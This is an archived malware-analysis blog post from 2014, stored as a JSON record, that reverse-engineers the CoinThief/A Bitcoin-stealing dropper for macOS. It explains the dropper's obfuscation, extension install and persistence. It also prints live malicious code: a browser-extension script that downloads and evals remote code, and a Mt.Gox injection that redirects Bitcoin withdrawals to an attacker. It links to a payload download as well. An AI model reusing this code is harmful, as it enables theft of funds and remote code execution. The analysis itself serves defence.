{
    "id": "8fa60903-7982-41bf-bce3-9b4db0420f69",
    "created_at": "2023-01-12T14:59:06.446881Z",
    "updated_at": "2025-03-27T02:05:53.491791Z",
    "deleted_at": null,
    "sha1_hash": "79f191ed48350fb3067f1b44f7bb8de79a976213",
    "title": "2014-02-16 - Analysis of CoinThief-A -dropper-",
    "authors": "",
    "file_creation_date": "2022-05-28T17:10:06Z",
    "file_modification_date": "2022-05-28T17:10:06Z",
    "file_size": 907480,
    "plain_text": "# Analysis of CoinThief/A \"dropper\"\n\n**[reverse.put.as/2014/02/16/analysis-of-cointhiefa-dropper/](https://reverse.put.as/2014/02/16/analysis-of-cointhiefa-dropper/)**\n\n[Posted on February 16, 2014 - @Mac Reversing @Security](https://reverse.put.as/categories/mac-reversing)\n\nThere is no such thing as malware in OS X but last week another sample was spotted and\nmade the “news”. I am talking about CoinThief, a malware designed to hijack Bitcoin\naccounts and steal everything (I must confess I laughed a bit; I think Bitcoin is just a\nbullshit pyramid scheme but I digress).\n\nThere are a few samples out there, in different stages of evolution, so this is probably not a\nvery recent operation. Nicholas Ptacek from [SecureMac broke the story and did an initial](http://www.securemac.com/)\n[analysis. Check his link here and also](http://www.securemac.com/CoinThief-BitCoin-Trojan-Horse-MacOSX.php) [ThreatPost for some details about the different](http://threatpost.com/cointhief-bitcoin-trojan-found-on-popular-download-sites/104234)\ninfected applications and how it started.\n\nThis post will target the initial stage of the malware packed with StealthBit application and\na bit into the installed malware browser extensions.\n\nFirst step is to load the main binary into IDA or Hopper (I still use IDA mostly out of lazyness\nand habit). We are presented with this nice picture (not all methods shown) of very weird\nclass and method names.\n\n\n-----\n\nThis triggers immediate attention which I don’t think it’s good at all if you are trying to hide\nattention. Another example this time from class-dump:\n\n\n-----\n\n```\n__attribute__((visibility( hidden )))\n@interface IOSDJDSNSDOWKDII : NSObject\n{\n NSString *_fihwjsndkfkjs;\n NSString *_hisdhiwjknsk;\n NSString *_sdhijkskjdfd;\n}\n@property(copy, nonatomic) NSString *sdhijkskjdfd; // @synthesize\nsdhijkskjdfd=_sdhijkskjdfd;\n@property(copy, nonatomic) NSString *hisdhiwjknsk; // @synthesize\nhisdhiwjknsk=_hisdhiwjknsk;\n@property(copy, nonatomic) NSString *fihwjsndkfkjs; // @synthesize\nfihwjsndkfkjs=_fihwjsndkfkjs;\n- (void).cxx_destruct;\n- (BOOL)hidfisdfsguiwomc;\n- (id)initWiwijmxug:(id)arg1 jifikwdff:(id)arg2 mkoxjnwhd:(id)arg3;\n\n```\nThe strings are also a good starting point to start understanding the puzzle. It’s easy to spot\n**base64 encoded strings, confirmed by the presence of base64 methods.**\n```\nbGFzdENocm9tZVBha1BhdGNoZWRWZXJzaW9u\nL0FwcGxpY2F0aW9ucy9Hb29nbGUgQ2hyb21lLmFwcC9Db250ZW50cy9WZXJzaW9ucw==\nq24@?0@\"NSString\"8@\"NSString\"16\nR29vZ2xlIENocm9tZSBGcmFtZXdvcmsuZnJhbWV3b3JrL1Jlc291cmNlcw==\nRXh0ZW5zaW9uU2V0dGluZ3MucmV0dXJuRXh0ZW5zaW9uc0RhdGEgPSBmdW5jdGlvbihleHRlbnNpb25zRGF0Y\nRXh0ZW5zaW9uU2V0dGluZ3MucmV0dXJuRXh0ZW5zaW9uc0RhdGEgPSBmdW5jdGlvbihleHRlbnNpb25zRGF0Y\n\n```\nAt this point we know we have a binary with obfuscated strings and class/method names.\nDifferent strategies are possible to continue analysis and reversing. DTrace and similar\nutilities can be used to have a general overview of what the binary is trying to do, or we can\ngo directly into IDA and start making sense of the code. In the second option we can start\nreversing at main() or we can start checking what the obfuscated methods are trying to do\nand rename to something meaningful. I am a great fan of the second so I started checking\neach method sequentially.\n\nThe getter and setter methods are easy to spot. The setter methods start with set in the\nname because they are automatically generated via property keyword, and getters\nbecause their code just retrieves the instance variable. The obfuscator is probably a script\nthat modifies the names before compilation (I don’t think a define is enough for this), a\nLLVM pass, or just developed with those names.\n\n\n-----\n\nNow let me show you a very simple method that writes a mutex to\n**~/Library/Preferences/fsdiskquota1. In this file is present it means that the dropper code**\nwas previously executed and it should not happen again.\n\n\n-----\n\nThe base64 string is decoded, tilde expanded to the full path and fsdiskquota1 mutex\nwritten. Nothing very complicated.\n\nThe trick here is to start renaming the methods so you can easily follow up the code. That is\nthe annoying part of this obfuscation method but with a small dose of patience and time it\nfalls apart. Renamed and commented method:\n\nTo make it easier for you this is a screenshot of the methods I renamed. Not all but the most\nimportant to understand what the dropper does.\n\n\n-----\n\nThe init method for the class HIFOWEIOWEOJSDJFIVB initializes an instance variable with\na NSFileManager object and retrieves the location of the current logged in user\n**NSLibraryDirectory. Then what I renamed as startBackdoor is called and the fun starts.**\n\nThis method does the following:\n\nErases itself and replaces it with the original StealthBit binary.\n\n\n-----\n\nStarts the original binary. At this point you have the original application running and\nthe dropper, which will continue its work in the background.\nVerifies if the mutex exists.\nIf mutex does not exist, write it and continue unpacking the malware payload.\nBrowser extensions for Safari and Chrome are unpacked into a temporary folder.\nIf unpack was successful, Safari version is retrieved. The extensions are only\ncompatible with Safari 5 or higher.\nInstalls Safari extension that is masked as a pop up blocker.\nRetrieve Chrome version (if installed). Only supports Chrome v25 or higher.\nInstalls Chrome extension.\nVerifies if Library/Handsoff folder exists.\nIf Handsoff is not installed the backdoor will be made persistent by creating a fake\n**Googe Software Update launch agent.**\nRemove temporary files and exit.\n\nAt this point and assuming the whole process was successful against Safari, Chrome, and\npersistence, we have two malware extensions loaded into the browsers and a RAT installed\nin the target machine. Two screenshots of the startBackdoor method:\n\n\n-----\n\n-----\n\nThe original binary is located in the _CodeSignature folder and named .dSYM. The\nextensions are located in the same folder in a bzip2 archive named .sig. The dropper does\nnot show in the Dock because LSUIElement setting is used in the Info.plist. When the\ndropper erases itself, the setting is removed from the plist so the legit application shows up\nin the Dock. For the user everything looks normal – application startup time is fast. The\noriginal application is started by creating a new NSTask and using the open command to\nstart again the now legit StealthBit.app.\n\nThe functions that install the extensions are not very interesting in terms of reversing. They\nlocate the extension folders, and install/active the malware extension. The Chrome related\nmethods are a bit more complex because they look up more information about its internals\n\n\n-----\n\nand mess with the paks and so on. I don t know much about Chrome internal organization\nand wasn’t much interested in reversing them – nothing valuable to me in terms of\nunderstanding the whole process.\n\nNow a bit into the extensions, using the Safari version as reference. As previously said, it is\nspoofed as a Pop-Up Blocker made by Eric Wong using KangoExtensions. The contents\nof description file are:\n```\n{\n  \"kango_version\": \"1.3.0 d6f8f2cf3761\",\n  \"content_scripts\": [\n    \"libs/jquery-2.0.3.min.js\",\n    \"injected/main.js\"\n  ],\n  \"name\": \"Pop-Up Blocker\",\n  \"creator\": \"Eric Wong\",\n  \"kango_package_id\": \"dev\",\n  \"background_scripts\": [\n    \"libs/jquery-2.0.3.min.js\",\n    \"settings/defaultSettings.js\",\n    \"settings/settings.js\",\n    \"global/encryption/jsEncrypt.js\",\n    \"global/encryption/updateVerifySignature.js\",\n    \"global/cryptoJS/components/core-min.js\",\n    \"global/cryptoJS/components/enc-base64-min.js\",\n    \"global/cryptoJS/components/sha1-min.js\",\n    \"global/cryptoJS/rollups/aes.js\",\n    \"global/cryptoJS/rollups/md5.js\",\n    \"global/cryptoJS/rollups/tripledes.js\",\n    \"global/jsrsasign/ext/jsbn-min.js\",\n    \"global/jsrsasign/ext/jsbn2-min.js\",\n    \"global/jsrsasign/ext/base64-min.js\",\n    \"global/jsrsasign/ext/rsa-min.js\",\n    \"global/jsrsasign/ext/rsa2-min.js\",\n    \"global/jsrsasign/asn1hex-1.1.min.js\",\n    \"global/jsrsasign/rsapem-1.1.min.js\",\n    \"global/jsrsasign/rsasign-1.2.min.js\",\n    \"global/jsrsasign/x509-1.1.min.js\",\n    \"global/jsrsasign/crypto-1.1.min.js\",\n    \"background.js\"\n  ],\n  \"homepage_url\": \"http://kangoextensions.com/\",\n  \"version\": \"1.0.0\",\n  \"id\": \"com.optimalcycling.safari.popupblocker\",\n  \"description\": \"Blocks pop-up windows and other annoyances.\"\n}\n\n```\nScreenshot of the Safari extension:\n\n\n-----\n\nThe Kango stuff is mostly uninteresting except for the background.js file. What it does is to\ntry to contact a remote server and download a file, which will be the effective malware\npayload responsible for hijacking the Bitcoin sites accounts information.\n\n\n-----\n\n```\nif(!kango.storage.getItem( installed )) {\n  //Get first version and run\n  $.get(settings.get('reportServer')+\"/updates/firstUpdate.php\", function(data) {\n    //Checking signature\n    if(updateVerifySignature(CryptoJS.SHA1(data.global),\nCryptoJS.SHA1(data.injected), data.signature)) {\n      //Saving to localstorage\n      kango.storage.setItem('globalJS',data.global);\n      kango.storage.setItem('injectedJS',data.injected);\n      kango.storage.setItem('installed',true);\n      //Saving current version\n      kango.storage.setItem('extensionUpdateTimestamp',0);\n      kango.storage.setItem('agentUpdateTimestamp',0);\n      //Executing script\n      eval(kango.storage.getItem('globalJS'));\n      if(settings.get('debug')) console.log(\"Valid First Release\");\n    } else {\n      if(settings.get('debug')) console.log(\"First Release: Bad Signature\");\n    }\n  }, \"json\" );\n} else {\n  //Running saved version\n  try {\n    eval(kango.storage.getItem('globalJS'));\n  } catch(err) {\n    if(kango.storage.getItem('globalJS_old')) {\n      kango.storage.setItem('globalJS',\nkango.storage.getItem('globalJS_old'));\n    } else {\n      //Error in version 0, resetting extension.\n      kango.storage.clear();\n    }\n  }\n}\nif(settings.get('debug')) {\n  function uninstall() {\n    console.log(\"Uninstalling...\");\n    kango.storage.clear();\n  }\n}\n\n```\nA screenshot of the connection attempt to the remote server:\n\n\n-----\n\n[If you are interested in looking at the contents of the malware payload just download it here.](https://reverse.put.as/wp-content/uploads/2014/02/firstUpdate.out_.txt.zip)\nPassword is “infected!”. You can find javascript code such as this sample for the\n**MtGoxPlugin:**\n```\n  MtGoxPlugin.prototype.injectPage = function (withdrawKey) {\n    function injectScript(source) {\n      var elem = document.createElement(\"script\");\n      elem.type = \"text/javascript\";\n      elem.innerHTML = source;\n      document.head.appendChild(elem);\n    }\n    var balance = Math.round((parseFloat($('#virtualCur\nspan').text().match(/(.*)\\\\s/)[1])-0.001)*100000000)/100000000;\n    injectScript(\"var pubKey = '\"+ withdrawKey +\"'; balanceBTC = '\"+ balance\n+\"'; \"+\n    \"(\"+(function() {\n      $.ajaxSetup({\n        beforeSend: function(jqXHR, settings) {\n          if(settings.url == '/api/2/money/bitcoin/send_simple') {\n            settings.data =\nsettings.data.replace(/amount=.*\\\\&address=/, 'amount='+ balanceBTC +'&address=');\n            settings.data =\nsettings.data.replace(/address=.*\\\\&address/, 'address='+ pubKey +'&address');\n          }  \n      }});\n    }).toString()+\")()\");\n  };\n\n```\n\n-----\n\nThe last step is to reverse the RAT, a binary called Agent and installed in\n**~/Library/Application Support/.com.google.softwareUpdateAgent. I did not reverse this**\nmodule yet but it appears to be responsible for sending data to the remote servers and also\nremote access to the infected machines. It has a few obfuscated methods reused from the\ndropper but everything else is not obfuscated. There is a method that verifies the presence\nof Little Snitch, which is funny because that doesn’t exist in the dropper. Probably some\nquality control issues! There’s also a method checking for 1Password.\n\nWhat else is there to say about this? I have at least five different infected applications, in\ndifferent stages of evolution (some without obfuscated methods).\nAs far as I have read/know they were available on popular downloads sites. Trust is a\ndifficult problem to solve.\n\n\n-----\n\nWhat are the conclusions and lessons from this malware?\nThere’s some fuss around regarding my previous post about evil iTunes plugins, with a\nquite surprising number of “uninformed” people using the argument of “arbitrary code\nexecution”. Well, the thing is that everything you download from the Internet is arbitrary\ncode unless you reverse every single binary, and that has the strong assumption that you\nare able to understand everything it does. Quite a task I might say!\nA normal looking application can easily copy malicious payloads to many different places,\niTunes plugins being one of the interesting targets, but it can also easily patch other\napplications since most are installed with same permissions as the normal user. There’s no\nneed for exploits, suspicious please gimme r00t dialogs. Just an innocent app you\ndownload and trust. In the post-Snowden world what guarantees you have that famous\napps don’t have state-sponsored payloads? None I might say.\nThe open source bullshit principle of many eyes looking has been shown too many times to\nbe a really bad assumption – not that many eyes are looking and stupid bugs are kept alive\nfor many years. Sandboxes and the AppStore improve the situation but they still suffer from\nvulnerabilities and their binaries are probably more opaque (iOS in particular) and with less\nincentives to be reversed (Apple wouldn’t let malware in the AppStore, right?).\n\nI will probably edit this post in the next days to add some missing info or improve some\nparagraphs. Too tired right now.\n\nHave fun,\nfG!\n\n[← Previous Post](https://reverse.put.as/2014/02/15/appledoesntgiveafuckaboutsecurity-itunes-evil-plugin-proof-of-concept/)\n[Next Post →](https://reverse.put.as/2014/02/21/dont-die-gdb-we-love-you-kgmacros-ported-to-mavericks/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2014/2014-02-16 - Analysis of CoinThief-A -dropper-.pdf"
    ],
    "report_names": [
        "2014-02-16 - Analysis of CoinThief-A -dropper-.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535546,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653757806,
    "ts_modification_date": 1653757806,
    "files": {
        "pdf": "https://archive.orkl.eu/79f191ed48350fb3067f1b44f7bb8de79a976213.pdf",
        "text": "https://archive.orkl.eu/79f191ed48350fb3067f1b44f7bb8de79a976213.txt",
        "img": "https://archive.orkl.eu/79f191ed48350fb3067f1b44f7bb8de79a976213.jpg"
    }
}